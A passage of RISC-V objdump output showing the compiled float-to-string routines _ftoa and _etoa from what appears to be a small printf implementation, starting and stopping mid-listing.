    10003972:	fc043c23          	sd	zero,-40(s0)
    10003976:	fe042783          	lw	a5,-32(s0)
    1000397a:	2785                	addiw	a5,a5,1
    1000397c:	fef42023          	sw	a5,-32(s0)
    10003980:	a03d                	j	100039ae <_ftoa+0x2ba>
    10003982:	fc843707          	fld	fa4,-56(s0)
    10003986:	00002797          	auipc	a5,0x2
    1000398a:	f4278793          	addi	a5,a5,-190 # 100058c8 <__am_mainargs+0x183>
    1000398e:	239c                	fld	fa5,0(a5)
    10003990:	a2f717d3          	flt.d	a5,fa4,fa5
    10003994:	ef89                	bnez	a5,100039ae <_ftoa+0x2ba>
    10003996:	fd843783          	ld	a5,-40(s0)
    1000399a:	c789                	beqz	a5,100039a4 <_ftoa+0x2b0>
    1000399c:	fd843783          	ld	a5,-40(s0)
    100039a0:	8b85                	andi	a5,a5,1
    100039a2:	c791                	beqz	a5,100039ae <_ftoa+0x2ba>
    100039a4:	fd843783          	ld	a5,-40(s0)
    100039a8:	0785                	addi	a5,a5,1
    100039aa:	fcf43c23          	sd	a5,-40(s0)
    100039ae:	f7442783          	lw	a5,-140(s0)
    100039b2:	2781                	sext.w	a5,a5
    100039b4:	e3bd                	bnez	a5,10003a1a <_ftoa+0x326>
    100039b6:	fe042783          	lw	a5,-32(s0)
    100039ba:	d20787d3          	fcvt.d.w	fa5,a5
    100039be:	f7843707          	fld	fa4,-136(s0)
    100039c2:	0af777d3          	fsub.d	fa5,fa4,fa5
    100039c6:	fcf43427          	fsd	fa5,-56(s0)
    100039ca:	fc843707          	fld	fa4,-56(s0)
    100039ce:	00002797          	auipc	a5,0x2
    100039d2:	efa78793          	addi	a5,a5,-262 # 100058c8 <__am_mainargs+0x183>
    100039d6:	239c                	fld	fa5,0(a5)
    100039d8:	a2f717d3          	flt.d	a5,fa4,fa5
    100039dc:	00f037b3          	snez	a5,a5
    100039e0:	0ff7f793          	zext.b	a5,a5
    100039e4:	0017c793          	xori	a5,a5,1
    100039e8:	0ff7f793          	zext.b	a5,a5
    100039ec:	eb99                	bnez	a5,10003a02 <_ftoa+0x30e>
    100039ee:	fc843707          	fld	fa4,-56(s0)
    100039f2:	00002797          	auipc	a5,0x2
    100039f6:	ed678793          	addi	a5,a5,-298 # 100058c8 <__am_mainargs+0x183>
    100039fa:	239c                	fld	fa5,0(a5)
    100039fc:	a2e797d3          	flt.d	a5,fa5,fa4
    10003a00:	c7f9                	beqz	a5,10003ace <_ftoa+0x3da>
    10003a02:	fe042783          	lw	a5,-32(s0)
    10003a06:	8b85                	andi	a5,a5,1
    10003a08:	2781                	sext.w	a5,a5
    10003a0a:	10078663          	beqz	a5,10003b16 <_ftoa+0x422>
    10003a0e:	fe042783          	lw	a5,-32(s0)
    10003a12:	2785                	addiw	a5,a5,1
    10003a14:	fef42023          	sw	a5,-32(s0)
    10003a18:	a8fd                	j	10003b16 <_ftoa+0x422>
    10003a1a:	f7442783          	lw	a5,-140(s0)
    10003a1e:	fcf42a23          	sw	a5,-44(s0)
    10003a22:	a0a9                	j	10003a6c <_ftoa+0x378>
    10003a24:	fd442783          	lw	a5,-44(s0)
    10003a28:	37fd                	addiw	a5,a5,-1
    10003a2a:	fcf42a23          	sw	a5,-44(s0)
    10003a2e:	fd843703          	ld	a4,-40(s0)
    10003a32:	47a9                	li	a5,10
    10003a34:	02f777b3          	remu	a5,a4,a5
    10003a38:	0ff7f713          	zext.b	a4,a5
    10003a3c:	fe843783          	ld	a5,-24(s0)
    10003a40:	00178693          	addi	a3,a5,1
    10003a44:	fed43423          	sd	a3,-24(s0)
    10003a48:	0307071b          	addiw	a4,a4,48
    10003a4c:	0ff77713          	zext.b	a4,a4
    10003a50:	17c1                	addi	a5,a5,-16
    10003a52:	97a2                	add	a5,a5,s0
    10003a54:	fae78823          	sb	a4,-80(a5)
    10003a58:	fd843703          	ld	a4,-40(s0)
    10003a5c:	47a9                	li	a5,10
    10003a5e:	02f757b3          	divu	a5,a4,a5
    10003a62:	fcf43c23          	sd	a5,-40(s0)
    10003a66:	fd843783          	ld	a5,-40(s0)
    10003a6a:	c799                	beqz	a5,10003a78 <_ftoa+0x384>
    10003a6c:	fe843703          	ld	a4,-24(s0)
    10003a70:	47fd                	li	a5,31
    10003a72:	fae7f9e3          	bgeu	a5,a4,10003a24 <_ftoa+0x330>
    10003a76:	a839                	j	10003a94 <_ftoa+0x3a0>
    10003a78:	0001                	nop
    10003a7a:	a829                	j	10003a94 <_ftoa+0x3a0>
    10003a7c:	fe843783          	ld	a5,-24(s0)
    10003a80:	00178713          	addi	a4,a5,1
    10003a84:	fee43423          	sd	a4,-24(s0)
    10003a88:	17c1                	addi	a5,a5,-16
    10003a8a:	97a2                	add	a5,a5,s0
    10003a8c:	03000713          	li	a4,48
    10003a90:	fae78823          	sb	a4,-80(a5)
    10003a94:	fe843703          	ld	a4,-24(s0)
    10003a98:	47fd                	li	a5,31
    10003a9a:	00e7e963          	bltu	a5,a4,10003aac <_ftoa+0x3b8>
    10003a9e:	fd442783          	lw	a5,-44(s0)
    10003aa2:	fff7871b          	addiw	a4,a5,-1
    10003aa6:	fce42a23          	sw	a4,-44(s0)
    10003aaa:	fbe9                	bnez	a5,10003a7c <_ftoa+0x388>
    10003aac:	fe843703          	ld	a4,-24(s0)
    10003ab0:	47fd                	li	a5,31
    10003ab2:	06e7e263          	bltu	a5,a4,10003b16 <_ftoa+0x422>
    10003ab6:	fe843783          	ld	a5,-24(s0)
    10003aba:	00178713          	addi	a4,a5,1
    10003abe:	fee43423          	sd	a4,-24(s0)
    10003ac2:	17c1                	addi	a5,a5,-16
    10003ac4:	97a2                	add	a5,a5,s0
    10003ac6:	02e00713          	li	a4,46
    10003aca:	fae78823          	sb	a4,-80(a5)
    10003ace:	a0a1                	j	10003b16 <_ftoa+0x422>
    10003ad0:	fe042783          	lw	a5,-32(s0)
    10003ad4:	873e                	mv	a4,a5
    10003ad6:	47a9                	li	a5,10
    10003ad8:	02f767bb          	remw	a5,a4,a5
    10003adc:	2781                	sext.w	a5,a5
    10003ade:	0ff7f713          	zext.b	a4,a5
    10003ae2:	fe843783          	ld	a5,-24(s0)
    10003ae6:	00178693          	addi	a3,a5,1
    10003aea:	fed43423          	sd	a3,-24(s0)
    10003aee:	0307071b          	addiw	a4,a4,48
    10003af2:	0ff77713          	zext.b	a4,a4
    10003af6:	17c1                	addi	a5,a5,-16
    10003af8:	97a2                	add	a5,a5,s0
    10003afa:	fae78823          	sb	a4,-80(a5)
    10003afe:	fe042783          	lw	a5,-32(s0)
    10003b02:	873e                	mv	a4,a5
    10003b04:	47a9                	li	a5,10
    10003b06:	02f747bb          	divw	a5,a4,a5
    10003b0a:	fef42023          	sw	a5,-32(s0)
    10003b0e:	fe042783          	lw	a5,-32(s0)
    10003b12:	2781                	sext.w	a5,a5
    10003b14:	c799                	beqz	a5,10003b22 <_ftoa+0x42e>
    10003b16:	fe843703          	ld	a4,-24(s0)
    10003b1a:	47fd                	li	a5,31
    10003b1c:	fae7fae3          	bgeu	a5,a4,10003ad0 <_ftoa+0x3dc>
    10003b20:	a011                	j	10003b24 <_ftoa+0x430>
    10003b22:	0001                	nop
    10003b24:	f6c42783          	lw	a5,-148(s0)
    10003b28:	8b89                	andi	a5,a5,2
    10003b2a:	2781                	sext.w	a5,a5
    10003b2c:	e3ad                	bnez	a5,10003b8e <_ftoa+0x49a>
    10003b2e:	f6c42783          	lw	a5,-148(s0)
    10003b32:	8b85                	andi	a5,a5,1
    10003b34:	2781                	sext.w	a5,a5
    10003b36:	cfa1                	beqz	a5,10003b8e <_ftoa+0x49a>
    10003b38:	f7042783          	lw	a5,-144(s0)
    10003b3c:	2781                	sext.w	a5,a5
    10003b3e:	cf8d                	beqz	a5,10003b78 <_ftoa+0x484>
    10003b40:	fe744783          	lbu	a5,-25(s0)
    10003b44:	0ff7f793          	zext.b	a5,a5
    10003b48:	e791                	bnez	a5,10003b54 <_ftoa+0x460>
    10003b4a:	f6c42783          	lw	a5,-148(s0)
    10003b4e:	8bb1                	andi	a5,a5,12
    10003b50:	2781                	sext.w	a5,a5
    10003b52:	c39d                	beqz	a5,10003b78 <_ftoa+0x484>
    10003b54:	f7042783          	lw	a5,-144(s0)
    10003b58:	37fd                	addiw	a5,a5,-1
    10003b5a:	f6f42823          	sw	a5,-144(s0)
    10003b5e:	a829                	j	10003b78 <_ftoa+0x484>
    10003b60:	fe843783          	ld	a5,-24(s0)
    10003b64:	00178713          	addi	a4,a5,1
    10003b68:	fee43423          	sd	a4,-24(s0)
    10003b6c:	17c1                	addi	a5,a5,-16
    10003b6e:	97a2                	add	a5,a5,s0
    10003b70:	03000713          	li	a4,48
    10003b74:	fae78823          	sb	a4,-80(a5)
    10003b78:	f7046783          	lwu	a5,-144(s0)
    10003b7c:	fe843703          	ld	a4,-24(s0)
    10003b80:	00f77763          	bgeu	a4,a5,10003b8e <_ftoa+0x49a>
    10003b84:	fe843703          	ld	a4,-24(s0)
    10003b88:	47fd                	li	a5,31
    10003b8a:	fce7fbe3          	bgeu	a5,a4,10003b60 <_ftoa+0x46c>
    10003b8e:	fe843703          	ld	a4,-24(s0)
    10003b92:	47fd                	li	a5,31
    10003b94:	06e7e763          	bltu	a5,a4,10003c02 <_ftoa+0x50e>
    10003b98:	fe744783          	lbu	a5,-25(s0)
    10003b9c:	0ff7f793          	zext.b	a5,a5
    10003ba0:	cf91                	beqz	a5,10003bbc <_ftoa+0x4c8>
    10003ba2:	fe843783          	ld	a5,-24(s0)
    10003ba6:	00178713          	addi	a4,a5,1
    10003baa:	fee43423          	sd	a4,-24(s0)
    10003bae:	17c1                	addi	a5,a5,-16
    10003bb0:	97a2                	add	a5,a5,s0
    10003bb2:	02d00713          	li	a4,45
    10003bb6:	fae78823          	sb	a4,-80(a5)
    10003bba:	a0a1                	j	10003c02 <_ftoa+0x50e>
    10003bbc:	f6c42783          	lw	a5,-148(s0)
    10003bc0:	8b91                	andi	a5,a5,4
    10003bc2:	2781                	sext.w	a5,a5
    10003bc4:	cf91                	beqz	a5,10003be0 <_ftoa+0x4ec>
    10003bc6:	fe843783          	ld	a5,-24(s0)
    10003bca:	00178713          	addi	a4,a5,1
    10003bce:	fee43423          	sd	a4,-24(s0)
    10003bd2:	17c1                	addi	a5,a5,-16
    10003bd4:	97a2                	add	a5,a5,s0
    10003bd6:	02b00713          	li	a4,43
    10003bda:	fae78823          	sb	a4,-80(a5)
    10003bde:	a015                	j	10003c02 <_ftoa+0x50e>
    10003be0:	f6c42783          	lw	a5,-148(s0)
    10003be4:	8ba1                	andi	a5,a5,8
    10003be6:	2781                	sext.w	a5,a5
    10003be8:	cf89                	beqz	a5,10003c02 <_ftoa+0x50e>
    10003bea:	fe843783          	ld	a5,-24(s0)
    10003bee:	00178713          	addi	a4,a5,1
    10003bf2:	fee43423          	sd	a4,-24(s0)
    10003bf6:	17c1                	addi	a5,a5,-16
    10003bf8:	97a2                	add	a5,a5,s0
    10003bfa:	02000713          	li	a4,32
    10003bfe:	fae78823          	sb	a4,-80(a5)
    10003c02:	f6c42683          	lw	a3,-148(s0)
    10003c06:	f7042783          	lw	a5,-144(s0)
    10003c0a:	fa040713          	addi	a4,s0,-96
    10003c0e:	88b6                	mv	a7,a3
    10003c10:	883e                	mv	a6,a5
    10003c12:	fe843783          	ld	a5,-24(s0)
    10003c16:	f8043683          	ld	a3,-128(s0)
    10003c1a:	f8843603          	ld	a2,-120(s0)
    10003c1e:	f9043583          	ld	a1,-112(s0)
    10003c22:	f9843503          	ld	a0,-104(s0)
    10003c26:	cf6ff0ef          	jal	1000311c <_out_rev>
    10003c2a:	87aa                	mv	a5,a0
    10003c2c:	853e                	mv	a0,a5
    10003c2e:	60ea                	ld	ra,152(sp)
    10003c30:	644a                	ld	s0,144(sp)
    10003c32:	610d                	addi	sp,sp,160
    10003c34:	8082                	ret

Disassembly of section .text._etoa:

0000000010003c36 <_etoa>:
    10003c36:	7135                	addi	sp,sp,-160
    10003c38:	ed06                	sd	ra,152(sp)
    10003c3a:	e922                	sd	s0,144(sp)
    10003c3c:	1100                	addi	s0,sp,160
    10003c3e:	faa43423          	sd	a0,-88(s0)
    10003c42:	fab43023          	sd	a1,-96(s0)
    10003c46:	f8c43c23          	sd	a2,-104(s0)
    10003c4a:	f8d43823          	sd	a3,-112(s0)
    10003c4e:	f8a43427          	fsd	fa0,-120(s0)
    10003c52:	863a                	mv	a2,a4
    10003c54:	86be                	mv	a3,a5
    10003c56:	8742                	mv	a4,a6
    10003c58:	87b2                	mv	a5,a2
    10003c5a:	f8f42223          	sw	a5,-124(s0)
    10003c5e:	87b6                	mv	a5,a3
    10003c60:	f8f42023          	sw	a5,-128(s0)
    10003c64:	87ba                	mv	a5,a4
    10003c66:	f6f42e23          	sw	a5,-132(s0)
    10003c6a:	f8843707          	fld	fa4,-120(s0)
    10003c6e:	f8843787          	fld	fa5,-120(s0)
    10003c72:	a2f727d3          	feq.d	a5,fa4,fa5
    10003c76:	c78d                	beqz	a5,10003ca0 <_etoa+0x6a>
    10003c78:	f8843707          	fld	fa4,-120(s0)
    10003c7c:	00002797          	auipc	a5,0x2
    10003c80:	c3478793          	addi	a5,a5,-972 # 100058b0 <__am_mainargs+0x16b>
    10003c84:	239c                	fld	fa5,0(a5)
    10003c86:	a2e797d3          	flt.d	a5,fa5,fa4
    10003c8a:	eb99                	bnez	a5,10003ca0 <_etoa+0x6a>
    10003c8c:	f8843707          	fld	fa4,-120(s0)
    10003c90:	00002797          	auipc	a5,0x2
    10003c94:	c1878793          	addi	a5,a5,-1000 # 100058a8 <__am_mainargs+0x163>
    10003c98:	239c                	fld	fa5,0(a5)
    10003c9a:	a2f717d3          	flt.d	a5,fa4,fa5
    10003c9e:	c795                	beqz	a5,10003cca <_etoa+0x94>
    10003ca0:	f7c42683          	lw	a3,-132(s0)
    10003ca4:	f8042783          	lw	a5,-128(s0)
    10003ca8:	f8442703          	lw	a4,-124(s0)
    10003cac:	8836                	mv	a6,a3
    10003cae:	f8843507          	fld	fa0,-120(s0)
    10003cb2:	f9043683          	ld	a3,-112(s0)
    10003cb6:	f9843603          	ld	a2,-104(s0)
    10003cba:	fa043583          	ld	a1,-96(s0)
    10003cbe:	fa843503          	ld	a0,-88(s0)
    10003cc2:	a33ff0ef          	jal	100036f4 <_ftoa>
    10003cc6:	87aa                	mv	a5,a0
    10003cc8:	a135                	j	100040f4 <_etoa+0x4be>
    10003cca:	f8843787          	fld	fa5,-120(s0)
    10003cce:	f2000753          	fmv.d.x	fa4,zero
    10003cd2:	a2e797d3          	flt.d	a5,fa5,fa4
    10003cd6:	00f037b3          	snez	a5,a5
    10003cda:	fef401a3          	sb	a5,-29(s0)
    10003cde:	fe344783          	lbu	a5,-29(s0)
    10003ce2:	0ff7f793          	zext.b	a5,a5
    10003ce6:	c799                	beqz	a5,10003cf4 <_etoa+0xbe>
    10003ce8:	f8843787          	fld	fa5,-120(s0)
    10003cec:	22f797d3          	fneg.d	fa5,fa5
    10003cf0:	f8f43427          	fsd	fa5,-120(s0)
    10003cf4:	f7c42783          	lw	a5,-132(s0)
    10003cf8:	4007f793          	andi	a5,a5,1024
    10003cfc:	2781                	sext.w	a5,a5
    10003cfe:	e781                	bnez	a5,10003d06 <_etoa+0xd0>
    10003d00:	4799                	li	a5,6
    10003d02:	f8f42223          	sw	a5,-124(s0)
    10003d06:	f8843787          	fld	fa5,-120(s0)
    10003d0a:	faf43c27          	fsd	fa5,-72(s0)
    10003d0e:	fb843783          	ld	a5,-72(s0)
    10003d12:	93d1                	srli	a5,a5,0x34
    10003d14:	2781                	sext.w	a5,a5
    10003d16:	7ff7f793          	andi	a5,a5,2047
    10003d1a:	2781                	sext.w	a5,a5
    10003d1c:	c017879b          	addiw	a5,a5,-1023
    10003d20:	fcf42e23          	sw	a5,-36(s0)
    10003d24:	fb843703          	ld	a4,-72(s0)
    10003d28:	2b401793          	bseti	a5,zero,0x34
    10003d2c:	17fd                	addi	a5,a5,-1
    10003d2e:	8f7d                	and	a4,a4,a5
    10003d30:	3ff00793          	li	a5,1023
    10003d34:	17d2                	slli	a5,a5,0x34
    10003d36:	8fd9                	or	a5,a5,a4
    10003d38:	faf43c23          	sd	a5,-72(s0)
    10003d3c:	fdc42783          	lw	a5,-36(s0)
    10003d40:	d2078753          	fcvt.d.w	fa4,a5
    10003d44:	00002797          	auipc	a5,0x2
    10003d48:	b8c78793          	addi	a5,a5,-1140 # 100058d0 <__am_mainargs+0x18b>
    10003d4c:	239c                	fld	fa5,0(a5)
    10003d4e:	12f77753          	fmul.d	fa4,fa4,fa5
    10003d52:	00002797          	auipc	a5,0x2
    10003d56:	b8678793          	addi	a5,a5,-1146 # 100058d8 <__am_mainargs+0x193>
    10003d5a:	239c                	fld	fa5,0(a5)
    10003d5c:	02f77753          	fadd.d	fa4,fa4,fa5
    10003d60:	fb843687          	fld	fa3,-72(s0)
    10003d64:	00002797          	auipc	a5,0x2
    10003d68:	b7c78793          	addi	a5,a5,-1156 # 100058e0 <__am_mainargs+0x19b>
    10003d6c:	239c                	fld	fa5,0(a5)
    10003d6e:	0af6f6d3          	fsub.d	fa3,fa3,fa5
    10003d72:	00002797          	auipc	a5,0x2
    10003d76:	b7678793          	addi	a5,a5,-1162 # 100058e8 <__am_mainargs+0x1a3>
    10003d7a:	239c                	fld	fa5,0(a5)
    10003d7c:	12f6f7d3          	fmul.d	fa5,fa3,fa5
    10003d80:	02f777d3          	fadd.d	fa5,fa4,fa5
    10003d84:	c20797d3          	fcvt.w.d	a5,fa5,rtz
    10003d88:	fef42623          	sw	a5,-20(s0)
    10003d8c:	fec42783          	lw	a5,-20(s0)
    10003d90:	d2078753          	fcvt.d.w	fa4,a5
    10003d94:	00002797          	auipc	a5,0x2
    10003d98:	b5c78793          	addi	a5,a5,-1188 # 100058f0 <__am_mainargs+0x1ab>
    10003d9c:	239c                	fld	fa5,0(a5)
    10003d9e:	12f77753          	fmul.d	fa4,fa4,fa5
    10003da2:	00002797          	auipc	a5,0x2
    10003da6:	b2678793          	addi	a5,a5,-1242 # 100058c8 <__am_mainargs+0x183>
    10003daa:	239c                	fld	fa5,0(a5)
    10003dac:	02f777d3          	fadd.d	fa5,fa4,fa5
    10003db0:	c20797d3          	fcvt.w.d	a5,fa5,rtz
    10003db4:	fcf42e23          	sw	a5,-36(s0)
    10003db8:	fec42783          	lw	a5,-20(s0)
    10003dbc:	d2078753          	fcvt.d.w	fa4,a5
    10003dc0:	00002797          	auipc	a5,0x2
    10003dc4:	b3878793          	addi	a5,a5,-1224 # 100058f8 <__am_mainargs+0x1b3>
    10003dc8:	239c                	fld	fa5,0(a5)
    10003dca:	12f77753          	fmul.d	fa4,fa4,fa5
    10003dce:	fdc42783          	lw	a5,-36(s0)
    10003dd2:	d20786d3          	fcvt.d.w	fa3,a5
    10003dd6:	00002797          	auipc	a5,0x2
    10003dda:	b2a78793          	addi	a5,a5,-1238 # 10005900 <__am_mainargs+0x1bb>
    10003dde:	239c                	fld	fa5,0(a5)
    10003de0:	12f6f7d3          	fmul.d	fa5,fa3,fa5
    10003de4:	0af777d3          	fsub.d	fa5,fa4,fa5
    10003de8:	fcf43827          	fsd	fa5,-48(s0)
    10003dec:	fd043787          	fld	fa5,-48(s0)
    10003df0:	12f7f7d3          	fmul.d	fa5,fa5,fa5
    10003df4:	fcf43427          	fsd	fa5,-56(s0)
    10003df8:	fdc42783          	lw	a5,-36(s0)
    10003dfc:	3ff7879b          	addiw	a5,a5,1023
    10003e00:	2781                	sext.w	a5,a5
    10003e02:	17d2                	slli	a5,a5,0x34
    10003e04:	faf43c23          	sd	a5,-72(s0)
    10003e08:	fb843707          	fld	fa4,-72(s0)
    10003e0c:	fd043787          	fld	fa5,-48(s0)
    10003e10:	02f7f6d3          	fadd.d	fa3,fa5,fa5
    10003e14:	00002797          	auipc	a5,0x2
    10003e18:	af478793          	addi	a5,a5,-1292 # 10005908 <__am_mainargs+0x1c3>
    10003e1c:	2390                	fld	fa2,0(a5)
    10003e1e:	fd043787          	fld	fa5,-48(s0)
    10003e22:	0af67653          	fsub.d	fa2,fa2,fa5
    10003e26:	fc843587          	fld	fa1,-56(s0)
    10003e2a:	00002797          	auipc	a5,0x2
    10003e2e:	ae678793          	addi	a5,a5,-1306 # 10005910 <__am_mainargs+0x1cb>
    10003e32:	239c                	fld	fa5,0(a5)
    10003e34:	1af5f5d3          	fdiv.d	fa1,fa1,fa5
    10003e38:	00002797          	auipc	a5,0x2
    10003e3c:	ae078793          	addi	a5,a5,-1312 # 10005918 <__am_mainargs+0x1d3>
    10003e40:	239c                	fld	fa5,0(a5)
    10003e42:	02f5f7d3          	fadd.d	fa5,fa1,fa5
    10003e46:	fc843587          	fld	fa1,-56(s0)
    10003e4a:	1af5f5d3          	fdiv.d	fa1,fa1,fa5
    10003e4e:	00002797          	auipc	a5,0x2
    10003e52:	ad278793          	addi	a5,a5,-1326 # 10005920 <__am_mainargs+0x1db>
    10003e56:	239c                	fld	fa5,0(a5)
    10003e58:	02f5f7d3          	fadd.d	fa5,fa1,fa5
    10003e5c:	fc843587          	fld	fa1,-56(s0)
    10003e60:	1af5f7d3          	fdiv.d	fa5,fa1,fa5
    10003e64:	02f677d3          	fadd.d	fa5,fa2,fa5
    10003e68:	1af6f6d3          	fdiv.d	fa3,fa3,fa5
    10003e6c:	00002797          	auipc	a5,0x2
    10003e70:	abc78793          	addi	a5,a5,-1348 # 10005928 <__am_mainargs+0x1e3>
    10003e74:	239c                	fld	fa5,0(a5)
    10003e76:	02f6f7d3          	fadd.d	fa5,fa3,fa5
    10003e7a:	12f777d3          	fmul.d	fa5,fa4,fa5
    10003e7e:	faf43c27          	fsd	fa5,-72(s0)
    10003e82:	fb843787          	fld	fa5,-72(s0)
    10003e86:	f8843707          	fld	fa4,-120(s0)
    10003e8a:	a2f717d3          	flt.d	a5,fa4,fa5
    10003e8e:	c38d                	beqz	a5,10003eb0 <_etoa+0x27a>
    10003e90:	fec42783          	lw	a5,-20(s0)
    10003e94:	37fd                	addiw	a5,a5,-1
    10003e96:	fef42623          	sw	a5,-20(s0)
    10003e9a:	fb843707          	fld	fa4,-72(s0)
    10003e9e:	00002797          	auipc	a5,0x2
    10003ea2:	a7a78793          	addi	a5,a5,-1414 # 10005918 <__am_mainargs+0x1d3>
    10003ea6:	239c                	fld	fa5,0(a5)
    10003ea8:	1af777d3          	fdiv.d	fa5,fa4,fa5
    10003eac:	faf43c27          	fsd	fa5,-72(s0)
    10003eb0:	fec42783          	lw	a5,-20(s0)
    10003eb4:	0007871b          	sext.w	a4,a5
    10003eb8:	06300793          	li	a5,99
    10003ebc:	00e7cc63          	blt	a5,a4,10003ed4 <_etoa+0x29e>
    10003ec0:	fec42783          	lw	a5,-20(s0)
    10003ec4:	0007871b          	sext.w	a4,a5
    10003ec8:	f9d00793          	li	a5,-99
    10003ecc:	00f74463          	blt	a4,a5,10003ed4 <_etoa+0x29e>
    10003ed0:	4791                	li	a5,4
    10003ed2:	a011                	j	10003ed6 <_etoa+0x2a0>
    10003ed4:	4795                	li	a5,5
    10003ed6:	fef42423          	sw	a5,-24(s0)
    10003eda:	f7c42783          	lw	a5,-132(s0)
    10003ede:	873e                	mv	a4,a5
    10003ee0:	28b01793          	bseti	a5,zero,0xb
    10003ee4:	8ff9                	and	a5,a5,a4
    10003ee6:	2781                	sext.w	a5,a5
    10003ee8:	c3d9                	beqz	a5,10003f6e <_etoa+0x338>
    10003eea:	f8843707          	fld	fa4,-120(s0)
    10003eee:	00002797          	auipc	a5,0x2
    10003ef2:	a4278793          	addi	a5,a5,-1470 # 10005930 <__am_mainargs+0x1eb>
    10003ef6:	239c                	fld	fa5,0(a5)
    10003ef8:	a2e787d3          	fle.d	a5,fa5,fa4
    10003efc:	cbb1                	beqz	a5,10003f50 <_etoa+0x31a>
    10003efe:	f8843707          	fld	fa4,-120(s0)
    10003f02:	00002797          	auipc	a5,0x2
    10003f06:	a3678793          	addi	a5,a5,-1482 # 10005938 <__am_mainargs+0x1f3>
    10003f0a:	239c                	fld	fa5,0(a5)
    10003f0c:	a2f717d3          	flt.d	a5,fa4,fa5
    10003f10:	c3a1                	beqz	a5,10003f50 <_etoa+0x31a>
    10003f12:	f8442703          	lw	a4,-124(s0)
    10003f16:	fec42783          	lw	a5,-20(s0)
    10003f1a:	2781                	sext.w	a5,a5
    10003f1c:	00e7dd63          	bge	a5,a4,10003f36 <_etoa+0x300>
    10003f20:	f8442783          	lw	a5,-124(s0)
    10003f24:	fec42703          	lw	a4,-20(s0)
    10003f28:	9f99                	subw	a5,a5,a4
    10003f2a:	2781                	sext.w	a5,a5
    10003f2c:	37fd                	addiw	a5,a5,-1
    10003f2e:	2781                	sext.w	a5,a5
    10003f30:	f8f42223          	sw	a5,-124(s0)
    10003f34:	a019                	j	10003f3a <_etoa+0x304>
    10003f36:	f8042223          	sw	zero,-124(s0)
    10003f3a:	f7c42783          	lw	a5,-132(s0)
    10003f3e:	4007e793          	ori	a5,a5,1024
    10003f42:	f6f42e23          	sw	a5,-132(s0)
    10003f46:	fe042423          	sw	zero,-24(s0)
    10003f4a:	fe042623          	sw	zero,-20(s0)
    10003f4e:	a005                	j	10003f6e <_etoa+0x338>
    10003f50:	f8442783          	lw	a5,-124(s0)
    10003f54:	2781                	sext.w	a5,a5
    10003f56:	cf81                	beqz	a5,10003f6e <_etoa+0x338>
    10003f58:	f7c42783          	lw	a5,-132(s0)
    10003f5c:	4007f793          	andi	a5,a5,1024
    10003f60:	2781                	sext.w	a5,a5
    10003f62:	c791                	beqz	a5,10003f6e <_etoa+0x338>
    10003f64:	f8442783          	lw	a5,-124(s0)
    10003f68:	37fd                	addiw	a5,a5,-1
    10003f6a:	f8f42223          	sw	a5,-124(s0)
    10003f6e:	f8042783          	lw	a5,-128(s0)
    10003f72:	fef42223          	sw	a5,-28(s0)
    10003f76:	f8042783          	lw	a5,-128(s0)
    10003f7a:	873e                	mv	a4,a5
    10003f7c:	fe842783          	lw	a5,-24(s0)
    10003f80:	2701                	sext.w	a4,a4
    10003f82:	2781                	sext.w	a5,a5
    10003f84:	00e7fc63          	bgeu	a5,a4,10003f9c <_etoa+0x366>
    10003f88:	fe442783          	lw	a5,-28(s0)
    10003f8c:	873e                	mv	a4,a5
    10003f8e:	fe842783          	lw	a5,-24(s0)
    10003f92:	40f707bb          	subw	a5,a4,a5
    10003f96:	fef42223          	sw	a5,-28(s0)
    10003f9a:	a019                	j	10003fa0 <_etoa+0x36a>
    10003f9c:	fe042223          	sw	zero,-28(s0)
    10003fa0:	f7c42783          	lw	a5,-132(s0)
    10003fa4:	8b89                	andi	a5,a5,2
    10003fa6:	2781                	sext.w	a5,a5
    10003fa8:	c799                	beqz	a5,10003fb6 <_etoa+0x380>
    10003faa:	fe842783          	lw	a5,-24(s0)
    10003fae:	2781                	sext.w	a5,a5
    10003fb0:	c399                	beqz	a5,10003fb6 <_etoa+0x380>
    10003fb2:	fe042223          	sw	zero,-28(s0)
    10003fb6:	fec42783          	lw	a5,-20(s0)
    10003fba:	2781                	sext.w	a5,a5
    10003fbc:	cb89                	beqz	a5,10003fce <_etoa+0x398>
    10003fbe:	fb843787          	fld	fa5,-72(s0)
    10003fc2:	f8843707          	fld	fa4,-120(s0)
    10003fc6:	1af777d3          	fdiv.d	fa5,fa4,fa5
    10003fca:	f8f43427          	fsd	fa5,-120(s0)
    10003fce:	f9843783          	ld	a5,-104(s0)
    10003fd2:	fcf43023          	sd	a5,-64(s0)
    10003fd6:	fe344783          	lbu	a5,-29(s0)
    10003fda:	0ff7f793          	zext.b	a5,a5
    10003fde:	c791                	beqz	a5,10003fea <_etoa+0x3b4>
    10003fe0:	f8843787          	fld	fa5,-120(s0)
    10003fe4:	22f797d3          	fneg.d	fa5,fa5
    10003fe8:	a019                	j	10003fee <_etoa+0x3b8>
    10003fea:	f8843787          	fld	fa5,-120(s0)
    10003fee:	f7c42783          	lw	a5,-132(s0)
    10003ff2:	873e                	mv	a4,a5
    10003ff4:	77fd                	lui	a5,0xfffff
    10003ff6:	7ff78793          	addi	a5,a5,2047 # fffffffffffff7ff <_bss_end+0xffffffff7ff36767>
    10003ffa:	8ff9                	and	a5,a5,a4
    10003ffc:	0007869b          	sext.w	a3,a5
    10004000:	fe442783          	lw	a5,-28(s0)
    10004004:	f8442703          	lw	a4,-124(s0)
    10004008:	8836                	mv	a6,a3
    1000400a:	22f78553          	fmv.d	fa0,fa5
    1000400e:	f9043683          	ld	a3,-112(s0)
    10004012:	f9843603          	ld	a2,-104(s0)
    10004016:	fa043583          	ld	a1,-96(s0)
    1000401a:	fa843503          	ld	a0,-88(s0)
    1000401e:	ed6ff0ef          	jal	100036f4 <_ftoa>
    10004022:	f8a43c23          	sd	a0,-104(s0)
    10004026:	fe842783          	lw	a5,-24(s0)
    1000402a:	2781                	sext.w	a5,a5
    1000402c:	c3f1                	beqz	a5,100040f0 <_etoa+0x4ba>
    1000402e:	f7c42783          	lw	a5,-132(s0)
    10004032:	0207f793          	andi	a5,a5,32
    10004036:	2781                	sext.w	a5,a5
    10004038:	c781                	beqz	a5,10004040 <_etoa+0x40a>
    1000403a:	04500793          	li	a5,69
    1000403e:	a019                	j	10004044 <_etoa+0x40e>
    10004040:	06500793          	li	a5,101
    10004044:	f9843703          	ld	a4,-104(s0)
    10004048:	00170693          	addi	a3,a4,1
    1000404c:	f8d43c23          	sd	a3,-104(s0)
    10004050:	fa843803          	ld	a6,-88(s0)
    10004054:	f9043683          	ld	a3,-112(s0)
    10004058:	863a                	mv	a2,a4
    1000405a:	fa043583          	ld	a1,-96(s0)
    1000405e:	853e                	mv	a0,a5
    10004060:	9802                	jalr	a6
